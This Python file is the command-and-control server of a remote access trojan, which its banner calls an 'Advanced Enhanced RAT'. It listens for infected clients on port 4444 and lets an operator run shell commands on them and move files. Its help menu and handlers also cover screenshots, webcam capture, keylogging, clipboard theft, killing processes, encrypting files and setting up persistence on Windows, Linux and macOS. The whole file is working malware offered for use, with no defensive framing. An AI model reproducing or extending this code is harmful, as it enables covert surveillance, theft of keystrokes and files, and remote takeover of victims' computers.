# server.py

import socket
import json
import threading
import platform
import os
import time

# --- Define Dummy Classes for Fallback ---
class DummyColors:
    def __getattr__(self, name):
        return ""
    # Explicitly define colors to avoid AttributeError
    red = ""
    green = ""
    yellow = ""
    cyan = ""
    blue = ""
    light_blue = ""
    light_green = ""
    magenta = ""
    purple = ""
    reset = ""

class DummyColorate:
    @staticmethod
    def Vertical(color, text, num):
        return text

class DummyCenter:
    @staticmethod
    def XCenter(text):
        return text

class DummyBox:
    @staticmethod
    def Simple(text):
        return text

# --- Initialize Defaults ---
Colors = DummyColors()
Colorate = DummyColorate()
Center = DummyCenter()
Box = DummyBox()

# --- Requirement Check for pystyle ---
print("[*] Checking Requirements Module.....")
try:
    from pystyle import Write, Colors as PystyleColors, Colorate, Center, Box
    Colors = PystyleColors
except ImportError:
    print("[!] pystyle not found. Attempting to install...")
    try:
        if platform.system().startswith("Windows"):
            os.system("python -m pip install pystyle -q -q -q")
        elif platform.system().startswith("Linux"):
            os.system("python3 -m pip install pystyle -q -q -q")
        else:
            os.system("python3 -m pip install pystyle -q -q -q")
        from pystyle import Write, Colors as PystyleColors, Colorate, Center, Box
        Colors = PystyleColors
        print("[+] pystyle installed successfully.")
    except Exception as e:
        print(f"[!] Failed to install pystyle: {e}. Using plain text output.")
        # Use dummy classes defined above

try:
    from cryptography.fernet import Fernet
except ImportError:
    print("[-] cryptography library not found. Encryption will fail. Run: pip install cryptography")
    Fernet = None

banner_text = r"""
 ░▒▓██████▓▒░░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓█▓▒░░▒▓███████▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░        
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░        
░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓█▓▒░░▒▓██████▓▒░  
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓███████▓▒░░▒▓█▓▒░▒▓███████▓▒░  
Advanced Enhanced RAT
"""
if platform.system() == "Windows":
    os.system("cls")
else:
    os.system("clear")
print(Colorate.Vertical(Colors.green_to_yellow, Center.XCenter(banner_text), 2))

# --- Encryption Settings ---
# REPLACE WITH YOUR VALID FERNET KEY (32 url-safe base64-encoded bytes)
ENCRYPTION_KEY = b'PpHc4oNDx6mSNPH8IAmMyEHyO_6nvIeyteEemFVGq9s='  # Replace with your key, e.g., b'gAAAAABj9Qz7X5Y2m1x8v3k4p6n9t2r5w7y0z8q1u3o5i7l4e6d2f8h0j9k3m5n7p1r4t6v8x0y2z4'

if Fernet:
    cipher = Fernet(ENCRYPTION_KEY)
else:
    cipher = None
    print("[-] Fernet cipher not initialized due to missing cryptography library.")

# --- Global Variables ---
targets = []
ips = []
client_info_map = {}
next_session_id = 0
stop_threads = False
server_socket = None

# --- Encryption Functions ---
def encrypt_data(data):
    if not cipher:
        print("[-] Encryption unavailable. Data will not be encrypted.")
        return data if isinstance(data, bytes) else data.encode('utf-8')
    try:
        if isinstance(data, dict):
            data = json.dumps(data)
        if isinstance(data, str):
            data = data.encode('utf-8')
        return cipher.encrypt(data)
    except Exception as e:
        print(f"[-] Encryption error: {e}")
        return None

def decrypt_data(encrypted_data):
    if not cipher:
        print("[-] Decryption unavailable. Assuming data is unencrypted.")
        return encrypted_data.decode('utf-8', errors='ignore') if isinstance(encrypted_data, bytes) else encrypted_data
    try:
        decrypted = cipher.decrypt(encrypted_data)
        return decrypted.decode('utf-8')
    except Exception as e:
        print(f"[-] Decryption error: {e}")
        return None

# --- Communication Functions ---
def send_data(target_socket, command_dict):
    try:
        encrypted_data = encrypt_data(command_dict)
        if encrypted_data:
            target_socket.send(encrypted_data)
    except Exception as e:
        print(f"\n{Colors.red}[!] Error sending data: {e}{Colors.reset}")
        handle_client_disconnection(target_socket)

def recv_data(target_socket):
    try:
        while True:
            chunk = target_socket.recv(4096)
            if not chunk:
                handle_client_disconnection(target_socket)
                return None
            decrypted_data = decrypt_data(chunk)
            if decrypted_data:
                try:
                    return json.loads(decrypted_data)
                except json.JSONDecodeError:
                    continue
            return None
    except Exception as e:
        print(f"\n{Colors.red}[!] Recv_data error: {e}{Colors.reset}")
        return None

# --- File Transfer Functions ---
def download_file_from_client(target_socket, file_name_to_save_on_server):
    try:
        metadata = recv_data(target_socket)
        if not metadata or 'file_size_for_download' not in metadata:
            print(f"{Colors.red}[-] Failed to receive file metadata from client.{Colors.reset}")
            return False
        encrypted_size = metadata['file_size_for_download']
        if encrypted_size == 0:
            with open(file_name_to_save_on_server, 'wb') as f:
                pass
            print(f"{Colors.green}[+] Empty file '{file_name_to_save_on_server}' downloaded.{Colors.reset}")
            return True
        with open(file_name_to_save_on_server, 'wb') as f:
            received_encrypted_bytes = b''
            while len(received_encrypted_bytes) < encrypted_size:
                chunk = target_socket.recv(min(4096, encrypted_size - len(received_encrypted_bytes)))
                if not chunk:
                    print(f"{Colors.red}[-] Connection lost during file download.{Colors.reset}")
                    return False
                received_encrypted_bytes += chunk
            decrypted_data = decrypt_data(received_encrypted_bytes)
            if decrypted_data:
                f.write(decrypted_data.encode('utf-8') if isinstance(decrypted_data, str) else decrypted_data)
                print(f"{Colors.green}[+] File '{file_name_to_save_on_server}' downloaded successfully.{Colors.reset}")
                return True
    except Exception as e:
        print(f"{Colors.red}[!] Error in download_file_from_client: {e}{Colors.reset}")
        return False

def upload_file_to_client(target_socket, file_name_on_server, file_name_on_client):
    try:
        if not os.path.exists(file_name_on_server):
            print(f"{Colors.red}[-] File '{file_name_on_server}' not found on server.{Colors.reset}")
            return False
        with open(file_name_on_server, 'rb') as f:
            data = f.read()
        encrypted_data = encrypt_data(data)
        if encrypted_data:
            send_data(target_socket, {'file_size_for_upload': len(encrypted_data)})
            target_socket.sendall(encrypted_data)
            print(f"{Colors.green}[+] File '{file_name_on_server}' uploaded as '{file_name_on_client}'.{Colors.reset}")
            return True
    except Exception as e:
        print(f"{Colors.red}[!] Error in upload_file_to_client: {e}{Colors.reset}")
        return False

# --- Client Management ---
def handle_client_disconnection(target_socket):
    global targets, ips, client_info_map
    disconnected_ip_str = None
    session_id_to_remove = None
    for ip_str, info in list(client_info_map.items()):
        if info['socket'] == target_socket:
            disconnected_ip_str = ip_str
            session_id_to_remove = info['session_id']
            break
    if disconnected_ip_str and disconnected_ip_str in client_info_map:
        print(f"\n{Colors.yellow}[-] Client {client_info_map[disconnected_ip_str].get('user', 'Unknown')}@{disconnected_ip_str} (Session {session_id_to_remove}) disconnected.{Colors.reset}")
        if target_socket in targets:
            targets.remove(target_socket)
        del client_info_map[disconnected_ip_str]
        new_ips_list = []
        for ip_s, c_info in client_info_map.items():
            try:
                ip_addr_part, port_part_str = ip_s.rsplit(':', 1)
                new_ips_list.append((ip_addr_part, int(port_part_str)))
            except ValueError:
                pass
        globals()['ips'] = new_ips_list
    try:
        target_socket.close()
    except:
        pass

# --- Shell Interaction with a Client ---
def shell(session_id):
    target_info = None
    for info in client_info_map.values():
        if info['session_id'] == session_id:
            target_info = info
            break
    if not target_info:
        print(f"{Colors.red}[!] No active session with ID {session_id}.{Colors.reset}")
        return
    target_socket = target_info['socket']
    client_display_name = f"{target_info.get('user', 'Unknown')}@{target_info.get('hostname', target_info['ip_str'])}"
    print(f"\n{Colors.cyan}[*] Interacting with session {session_id} ({client_display_name}). Type 'help' for session commands.{Colors.reset}")

    while True:
        try:
            raw_command = input(f"{Colors.yellow}Shell Session {session_id} ({client_display_name}) > {Colors.reset}")
            command_parts = raw_command.strip().split(" ", 1)
            base_cmd = command_parts[0].lower()
            args = command_parts[1] if len(command_parts) > 1 else ""

            if not base_cmd:
                continue
            if base_cmd == 'help':
                print(Colorate.Vertical(Colors.red_to_purple, """
    **** SHELL COMMANDS MENU ****
    
    === General Commands ===
    <any_shell_command>
        Description: Execute any shell command on the client (e.g., ls, dir, whoami, pwd).
        Usage: dir / ls -la
        Example: whoami
        Output: Returns command output (e.g., current username).
        Note: Shell commands are executed in the client's environment.

    cd <directory>
        Description: Change the client's current working directory.
        Usage: cd <path_to_directory>
        Example: cd /tmp or cd C:\\Users
        Output: Confirms new directory or error if path is invalid.
        Note: Use 'cd ..' to move up one directory.

    === File Transfer Commands ===
    download <client_filepath> [server_save_as]
        Description: Download a file from the client to the server.
        Args:
            client_filepath: Path to file on client.
            server_save_as: Optional name to save file on server (default: sessionID_filename).
        Usage: download /home/user/file.txt
        Example: download C:\\Users\\User\\doc.txt my_doc.txt
        Output: Saves file to server directory and reports success/failure.
        Note: File is encrypted during transfer.

    upload <server_filepath> [client_save_as]
        Description: Upload a file from the server to the client.
        Args:
            server_filepath: Path to file on server.
            client_save_as: Optional name to save file on client (default: original filename).
        Usage: upload myfile.txt
        Example: upload /tmp/test.txt /home/user/test.txt
        Output: Reports success/failure of file transfer.
        Note: File is encrypted during transfer.

    === Surveillance Commands ===
    screenshot
        Description: Capture the client's screen and download the image.
        Usage: screenshot
        Output: Saves as sessionID_screenshot.png on server.
        Example: screenshot
        Note: Requires 'mss' library on client.

    webcam
        Description: Capture an image from the client's webcam and download it.
        Usage: webcam
        Output: Saves as sessionID_webcam.jpg on server.
        Example: webcam
        Note: Requires 'opencv-python' library and webcam access on client.

    sysinfo
        Description: Retrieve detailed system information from the client.
        Usage: sysinfo
        Output: Displays OS, CPU, RAM, disk usage, IP, MAC address, and more.
        Example: sysinfo
        Note: Enhanced with 'psutil' library for detailed metrics.

    keylog_start
        Description: Start the keylogger on the client to capture keystrokes.
        Usage: keylog_start
        Output: Confirms keylogger started.
        Example: keylog_start
        Note: Keystrokes are saved to a file on the client until retrieved.

    keylog_stop
        Description: Stop the keylogger on the client.
        Usage: keylog_stop
        Output: Confirms keylogger stopped.
        Example: keylog_stop
        Note: Stops capturing new keystrokes.

    get_keylogs
        Description: Download the keylog file from the client.
        Usage: get_keylogs
        Output: Saves as sessionID_keylog.txt on server.
        Example: get_keylogs
        Note: Retrieves all logged keystrokes since keylogger started.

    === Process Management ===
    process_list
        Description: List all running processes on the client.
        Usage: process_list
        Output: Displays PID, process name, and username for each process.
        Example: process_list
        Note: Requires 'psutil' library on client.

    kill_process <pid>
        Description: Terminate a process on the client by PID.
        Usage: kill_process <pid>
        Example: kill_process 1234
        Output: Confirms process termination or error if PID is invalid.
        Note: Use 'process_list' to find valid PIDs.

    === Clipboard Operations ===
    get_clipboard
        Description: Retrieve the current content of the client's clipboard.
        Usage: get_clipboard
        Output: Displays clipboard content (text).
        Example: get_clipboard
        Note: Requires 'pyperclip' library on client.

    set_clipboard <content>
        Description: Set the client's clipboard to the specified content.
        Usage: set_clipboard <text>
        Example: set_clipboard "Confidential data"
        Output: Confirms clipboard updated.
        Note: Requires 'pyperclip' library on client.

    === File Encryption ===
    encrypt_file <filepath>
        Description: Encrypt a file on the client using AES (Fernet).
        Usage: encrypt_file <path_to_file>
        Example: encrypt_file /home/user/doc.txt
        Output: Creates doc.txt.encrypted and reports success.
        Note: Requires 'cryptography' library on client.

    decrypt_file <filepath>
        Description: Decrypt a previously encrypted file on the client.
        Usage: decrypt_file <path_to_encrypted_file>
        Example: decrypt_file /home/user/doc.txt.encrypted
        Output: Restores original file and reports success.
        Note: Requires same Fernet key used for encryption.

    === Persistence ===
    persist
        Description: Establish persistence to run client on startup.
        Usage: persist
        Output: Configures Registry (Windows), Crontab (Linux), or LaunchAgent (macOS).
        Example: persist
        Notes:
            - Windows: Adds to HKCU\\Run registry key.
            - Linux: Adds to crontab (runs every minute).
            - macOS: Creates a LaunchAgent for user-level persistence.
            - Requires appropriate permissions on client.

    === User Interaction ===
    lock_screen
        Description: Lock the client's screen, requiring user authentication to unlock.
        Usage: lock_screen
        Output: Confirms screen locked or reports error.
        Example: lock_screen
        Notes:
            - Windows: Uses LockWorkStation API.
            - Linux: Uses xdg-screensaver.
            - macOS: Triggers display sleep.
            - Requires 'pyautogui' library on client.

    send_message <message>
        Description: Display a pop-up message on the client's screen.
        Usage: send_message <message_text>
        Example: send_message "System maintenance in 5 minutes."
        Output: Confirms message displayed.
        Note: Requires 'pyautogui' library and a graphical environment.

    open_url <URL>
        Description: Open a URL in the client's default web browser.
        Usage: open_url <URL>
        Example: open_url https://example.com
        Output: Confirms URL opened or reports error.
        Note: Uses 'webbrowser' library (standard in Python).

    === Network Management ===
    get_network_info
        Description: Retrieve network interface details (IP, MAC, netmask) from the client.
        Usage: get_network_info
        Output: Lists all network interfaces with addresses and netmasks.
        Example: get_network_info
        Note: Requires 'psutil' library on client.

    === Command Queue Management ===
    view_queue
        Description: Display the client's queued commands (for offline processing).
        Usage: view_queue
        Output: Lists all commands in the client's queue.
        Example: view_queue
        Note: Queued commands are executed when the client reconnects.

    clear_queue
        Description: Clear all queued commands on the client.
        Usage: clear_queue
        Output: Confirms queue cleared.
        Example: clear_queue
        Note: Removes all pending offline commands.

    === Session Management ===
    bg / background / q
        Description: Exit shell session and return to main server menu.
        Usage: bg / background / q
        Output: Returns to server prompt; session remains active.
        Example: bg

    kill_client
        Description: Terminate the client program remotely.
        Usage: kill_client
        Output: Client disconnects and program exits.
        Example: kill_client
        Note: Client will not reconnect unless restarted.

    exit_shell
        Description: Alias for 'bg' to exit the shell session.
        Usage: exit_shell
        Output: Returns to server prompt.
        Example: exit_shell
                """, 2))
                continue
            elif base_cmd in ['bg', 'background', 'q', 'exit_shell']:
                print(f"{Colors.cyan}[*] Returning to main server menu. Session {session_id} remains active.{Colors.reset}")
                break
            elif base_cmd == 'kill_client':
                print(f"{Colors.red}[!] Sending kill command to client session {session_id}...{Colors.reset}")
                send_data(target_socket, {"cmd": "kill_client"})
                print(f"{Colors.yellow}[*] Client program for session {session_id} should terminate.{Colors.reset}")
                return
            elif base_cmd == 'cd':
                send_data(target_socket, {"cmd": "cd", "args": args})
            elif base_cmd == 'upload':
                server_file = args.split(" ")[0] if args else ""
                client_file = args.split(" ")[1] if len(args.split(" ")) > 1 else os.path.basename(server_file)
                if not server_file:
                    print(f"{Colors.red}[-] Usage: upload <server_filepath> [client_save_as]{Colors.reset}")
                    continue
                send_data(target_socket, {"cmd": "upload", "args": client_file})
                time.sleep(0.2)
                upload_file_to_client(target_socket, server_file, client_file)
                client_response = recv_data(target_socket)
                if client_response and isinstance(client_response, dict) and "message" in client_response:
                    print(f"{Colors.cyan}Client: {client_response['message']}{Colors.reset}")
            elif base_cmd == 'download':
                client_file = args.split(" ")[0] if args else ""
                server_file = args.split(" ")[1] if len(args.split(" ")) > 1 else f"session{session_id}_{os.path.basename(client_file)}"
                if not client_file:
                    print(f"{Colors.red}[-] Usage: download <client_filepath> [server_save_as]{Colors.reset}")
                    continue
                send_data(target_socket, {"cmd": "download", "args": client_file})
                download_file_from_client(target_socket, server_file)
                continue
            elif base_cmd == 'screenshot':
                send_data(target_socket, {"cmd": "screenshot"})
                print(f"{Colors.blue}[*] Requesting screenshot... waiting for file transfer...{Colors.reset}")
                save_as = f"session{session_id}_screenshot.png"
                download_file_from_client(target_socket, save_as)
                continue
            elif base_cmd == 'webcam':
                send_data(target_socket, {"cmd": "webcam"})
                print(f"{Colors.blue}[*] Requesting webcam capture... waiting for file transfer...{Colors.reset}")
                save_as = f"session{session_id}_webcam.jpg"
                download_file_from_client(target_socket, save_as)
                continue
            elif base_cmd == 'sysinfo':
                send_data(target_socket, {"cmd": "sysinfo"})
            elif base_cmd == 'process_list':
                send_data(target_socket, {"cmd": "process_list"})
            elif base_cmd == 'kill_process':
                if args.isdigit():
                    send_data(target_socket, {"cmd": "kill_process", "args": args})
                else:
                    print(f"{Colors.red}[-] Usage: kill_process <pid>{Colors.reset}")
                    continue
            elif base_cmd == 'get_clipboard':
                send_data(target_socket, {"cmd": "get_clipboard"})
            elif base_cmd == 'set_clipboard':
                if args:
                    send_data(target_socket, {"cmd": "set_clipboard", "args": args})
                else:
                    print(f"{Colors.red}[-] Usage: set_clipboard <content>{Colors.reset}")
                    continue
            elif base_cmd == 'encrypt_file':
                if args:
                    send_data(target_socket, {"cmd": "encrypt_file", "args": args})
                else:
                    print(f"{Colors.red}[-] Usage: encrypt_file <filepath>{Colors.reset}")
                    continue
            elif base_cmd == 'decrypt_file':
                if args:
                    send_data(target_socket, {"cmd": "decrypt_file", "args": args})
                else:
                    print(f"{Colors.red}[-] Usage: decrypt_file <filepath>{Colors.reset}")
                    continue
            elif base_cmd == 'keylog_start':
                send_data(target_socket, {"cmd": "keylog_start"})
            elif base_cmd == 'keylog_stop':
                send_data(target_socket, {"cmd": "keylog_stop"})
            elif base_cmd == 'get_keylogs':
                send_data(target_socket, {"cmd": "get_keylogs"})
                print(f"{Colors.blue}[*] Requesting keylogs... waiting for file transfer...{Colors.reset}")
                save_as = f"session{session_id}_keylog.txt"
                download_file_from_client(target_socket, save_as)
                continue
            elif base_cmd == 'persist':
                send_data(target_socket, {"cmd": "persist"})
            elif base_cmd == 'lock_screen':
                send_data(target_socket, {"cmd": "lock_screen"})
            elif base_cmd == 'send_message':
                if args:
                    send_data(target_socket, {"cmd": "send_message", "args": args})
                else:
                    print(f"{Colors.red}[-] Usage: send_message <message>{Colors.reset}")
                    continue
            elif base_cmd == 'open_url':
                if args:
                    send_data(target_socket, {"cmd": "open_url", "args": args})
                else:
                    print(f"{Colors.red}[-] Usage: open_url <URL>{Colors.reset}")
                    continue
            elif base_cmd == 'get_network_info':
                send_data(target_socket, {"cmd": "get_network_info"})
            elif base_cmd == 'view_queue':
                send_data(target_socket, {"cmd": "view_queue"})
            elif base_cmd == 'clear_queue':
                send_data(target_socket, {"cmd": "clear_queue"})
            else:
                send_data(target_socket, {"cmd": raw_command.strip()})
            
            if base_cmd not in ['upload', 'download', 'screenshot', 'webcam', 'get_keylogs']:
                response = recv_data(target_socket)
                if response is None:
                    print(f"{Colors.red}[!] Session {session_id} appears to have disconnected.{Colors.reset}")
                    break
                if isinstance(response, dict):
                    if response.get("type") == "cmd_result":
                        print(f"{Colors.green}{response.get('output', 'No output received.')}{Colors.reset}")
                    elif response.get("type") == "sysinfo_result":
                        if "data" in response:
                            print(f"{Colors.light_blue}--- System Information for Session {session_id} ---{Colors.reset}")
                            for key, value in response["data"].items():
                                print(f"{Colors.cyan}{key.replace('_', ' ').title()}: {Colors.light_green}{value}{Colors.reset}")
                            print(f"{Colors.light_blue}--- End System Information ---{Colors.reset}")
                        else:
                            print(f"{Colors.red}Sysinfo error: {response.get('error', 'Unknown error')}{Colors.reset}")
                    elif response.get("type") == "process_list":
                        if "data" in response:
                            print(f"{Colors.light_blue}--- Process List for Session {session_id} ---{Colors.reset}")
                            for proc in response["data"]:
                                print(f"{Colors.cyan}PID: {proc['pid']}, Name: {proc['name']}, User: {proc['username']}{Colors.reset}")
                            print(f"{Colors.light_blue}--- End Process List ---{Colors.reset}")
                        else:
                            print(f"{Colors.red}Process list error: {response.get('error', 'Unknown error')}{Colors.reset}")
                    elif response.get("type") == "clipboard_content":
                        print(f"{Colors.light_blue}Clipboard Content for Session {session_id}: {Colors.light_green}{response.get('data', 'Empty')}{Colors.reset}")
                    elif response.get("type") == "network_info":
                        if "data" in response:
                            print(f"{Colors.light_blue}--- Network Information for Session {session_id} ---{Colors.reset}")
                            for interface, addrs in response["data"].items():
                                print(f"{Colors.cyan}Interface: {interface}{Colors.reset}")
                                for addr in addrs:
                                    print(f"  Address: {addr['address']}, Netmask: {addr.get('netmask', 'N/A')}, Family: {addr['family']}")
                            print(f"{Colors.light_blue}--- End Network Information ---{Colors.reset}")
                        else:
                            print(f"{Colors.red}Network info error: {response.get('error', 'Unknown error')}{Colors.reset}")
                    elif response.get("type") == "command_queue":
                        if "data" in response:
                            print(f"{Colors.light_blue}--- Command Queue for Session {session_id} ---{Colors.reset}")
                            if response["data"]:
                                for i, cmd in enumerate(response["data"], 1):
                                    print(f"{Colors.cyan}{i}. Command: {cmd.get('cmd', 'Unknown')}, Args: {cmd.get('args', 'None')}{Colors.reset}")
                            else:
                                print(f"{Colors.yellow}No commands in queue.{Colors.reset}")
                            print(f"{Colors.light_blue}--- End Command Queue ---{Colors.reset}")
                        else:
                            print(f"{Colors.red}Command queue error: {response.get('error', 'Unknown error')}{Colors.reset}")
                    elif "status" in response:
                        color = Colors.green if response["status"] == "success" else Colors.yellow if response["status"] == "info" else Colors.red
                        print(f"{color}Client Response: {response['message']}{Colors.reset}")
                    else:
                        print(f"{Colors.yellow}Unexpected client data: {response}{Colors.reset}")
                else:
                    print(f"{Colors.yellow}Received raw/non-JSON response: {response}{Colors.reset}")
        except KeyboardInterrupt:
            print(f"\n{Colors.yellow}[!] Shell interaction interrupted. Returning to main menu.{Colors.reset}")
            break
        except Exception as e:
            print(f"{Colors.red}[!] Error in shell for session {session_id}: {e}{Colors.reset}")
            if target_socket.fileno() == -1:
                print(f"{Colors.red}[!] Socket for session {session_id} seems closed.{Colors.reset}")
                handle_client_disconnection(target_socket)
                break

# --- Server Main Loop ---
def server_listen():
    global server_socket, targets, ips, client_info_map, next_session_id, stop_threads
    bind_ip = "0.0.0.0"
    bind_port = 4444
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((bind_ip, bind_port))
        server_socket.listen(5)
    except Exception as e:
        print(f"{Colors.red}[!] Failed to bind server to {bind_ip}:{bind_port} - {e}{Colors.reset}")
        stop_threads = True
        return
    print(Colorate.Vertical(Colors.green_to_yellow, f"\n[*] Server listening on: {bind_ip}:{bind_port}", 2))

    while not stop_threads:
        server_socket.settimeout(1.0)
        try:
            client_socket, client_address = server_socket.accept()
            client_socket.settimeout(None)
            initial_data_payload = recv_data(client_socket)
            if initial_data_payload and isinstance(initial_data_payload, dict) and initial_data_payload.get("type") == "initial_info":
                info_str = initial_data_payload.get("data", "Unknown,Unknown,Unknown")
                hostname, mac_address, username = info_str.split(',', 2) if info_str.count(',') == 2 else ("Unknown", "Unknown", "Unknown")
                ip_str = f"{client_address[0]}:{client_address[1]}"
                targets.append(client_socket)
                ips.append(client_address)
                client_info_map[ip_str] = {
                    'socket': client_socket,
                    'ip_str': ip_str,
                    'hostname': hostname,
                    'mac': mac_address,
                    'user': username,
                    'session_id': next_session_id,
                    'connected_at': time.strftime("%Y-%m-%d %H:%M:%S")
                }
                session_id = next_session_id
                next_session_id += 1
                print(f"\n{Colors.green}[+] Connection from: {username}@{hostname} ({ip_str}) - Session ID: {session_id}{Colors.reset}")
                print(Colorate.Vertical(Colors.green_to_yellow, "\n[*] Server Command (Type 'help'):", 2), end='')
            else:
                print(f"{Colors.red}[-] Failed to get initial info from {client_address[0]}:{client_address[1]}.{Colors.reset}")
                client_socket.close()
        except socket.timeout:
            continue
        except Exception as e:
            if not stop_threads:
                print(f"{Colors.red}[!] Error in server_listen: {e}{Colors.reset}")
            continue
    print(f"{Colors.red}\n[*] Server listen thread shutting down...{Colors.reset}")
    for target_sock in targets:
        try:
            target_sock.close()
        except:
            pass
    if server_socket:
        server_socket.close()

def list_sessions():
    if not client_info_map:
        print(f"\n{Colors.yellow}[-] No active client connections.{Colors.reset}")
        return
    header = " ID | USERNAME@HOSTNAME        | MAC ADDRESS         | IP ADDRESS         | CONNECTED SINCE"
    # Check if Box is the real pystyle Box or a dummy
    if Box != DummyBox:
        print(f"\n{Colors.light_blue}{Box.Simple(header)}{Colors.reset}")
    else:
        print(f"\n{Colors.light_blue}{header}{Colors.reset}")
        print(f"{Colors.light_blue}{'-' * len(header)}{Colors.reset}")
    sorted_clients = sorted(client_info_map.values(), key=lambda x: x['session_id'])
    for info in sorted_clients:
        session_id_str = f"{info['session_id']:<3}"
        user_host = f"{info.get('user', 'N/A')}@{info.get('hostname', 'N/A')}"
        user_host_str = f"{user_host[:24]:<26}" if len(user_host) > 24 else f"{user_host:<26}"
        mac_str = f"{info.get('mac', 'N/A'):<17}"
        ip_str = f"{info.get('ip_str', 'N/A'):<19}"
        connected_at_str = f"{info.get('connected_at', 'N/A')}"
        print(f"{Colors.cyan}{session_id_str}{Colors.reset} | {Colors.green}{user_host_str}{Colors.reset}| {Colors.yellow}{mac_str}{Colors.reset}| {Colors.magenta}{ip_str}{Colors.reset}| {Colors.cyan}{connected_at_str}{Colors.reset}")

if __name__ == '__main__':
    listen_thread = threading.Thread(target=server_listen, daemon=True)
    listen_thread.start()
    try:
        while not stop_threads:
            time.sleep(0.1)
            raw_main_cmd = input(Colorate.Vertical(Colors.green_to_yellow, "\n[*] Server Command (Type 'help' for options): ", 2))
            main_cmd_parts = raw_main_cmd.strip().split(" ", 1)
            command = main_cmd_parts[0].lower()
            cmd_args = main_cmd_parts[1] if len(main_cmd_parts) > 1 else ""
            if command == "help":
                print(Colorate.Vertical(Colors.red_to_purple, """
    **** SERVER COMMANDS MAIN MENU ****
    targets / sessions / list
        Description: Display all connected clients with details.
        Usage: targets / sessions / list
        Output: Shows session ID, username, hostname, MAC, IP, and connection time.

    session <ID>
        Description: Interact with a specific client session.
        Usage: session <ID>
        Example: session 0
        Output: Enters interactive shell for the client.

    cls / clear
        Description: Clear the server console screen.
        Usage: cls / clear
        Output: Refreshes the console with the RAT banner.

    exit / quit
        Description: Terminate the server and disconnect all clients.
        Usage: exit / quit
        Output: Shuts down the server gracefully.
                """, 2))
            elif command in ["targets", "sessions", "list"]:
                list_sessions()
            elif command == "session":
                if cmd_args.isdigit():
                    session_to_select = int(cmd_args)
                    active_session_ids = [info['session_id'] for info in client_info_map.values()]
                    if session_to_select in active_session_ids:
                        shell(session_to_select)
                    else:
                        print(f"{Colors.red}[-] No active session with ID {session_to_select}.{Colors.reset}")
                else:
                    print(f"{Colors.red}[-] Usage: session <ID>{Colors.reset}")
            elif command in ["cls", "clear"]:
                if platform.system() == "Windows":
                    os.system("cls")
                else:
                    os.system("clear")
                print(Colorate.Vertical(Colors.green_to_yellow, Center.XCenter(banner_text), 2))
            elif command in ["exit", "quit"]:
                print(f"{Colors.red}[*] Initiating server shutdown...{Colors.reset}")
                stop_threads = True
                break
            elif not command:
                continue
            else:
                print(f"{Colors.yellow}[?] Unknown command: '{command}'. Type 'help' for options.{Colors.reset}")
    except KeyboardInterrupt:
        print(f"\n{Colors.red}[*] Keyboard interrupt detected. Shutting down server...{Colors.reset}")
        stop_threads = True
    except Exception as e:
        print(f"\n{Colors.red}[!] Unhandled error in server: {e}{Colors.reset}")
        stop_threads = True
    finally:
        print(f"{Colors.blue}[*] Closing server threads...{Colors.reset}")
        if server_socket:
            try:
                server_socket.close()
            except:
                pass
        if listen_thread.is_alive():
            listen_thread.join(timeout=5.0)
        print(f"[*] Server shutdown complete.")